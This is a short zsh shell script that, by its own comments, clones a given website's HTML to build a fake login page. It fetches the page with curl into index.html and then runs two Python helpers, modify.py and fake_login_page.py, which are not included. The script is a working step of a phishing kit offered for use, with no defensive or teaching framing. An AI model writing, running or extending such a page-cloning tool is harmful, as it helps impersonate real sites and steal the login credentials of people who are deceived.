#!/usr/bin/zsh

#While using this script use ./webpage_clone.sh [specified url]
#This program copies the html of the given url used to create a fake login page

if [ -z "$1" ]; then
  echo "Usage: $0 <url>"
  exit 1
fi

url=$1
output="index.html"

curl -s $url > $output #file is saved in an index.html file
echo "[+] File saved"

python modify.py
sleep 2 #waiting time for the modification to be made
python fake_login_page.py
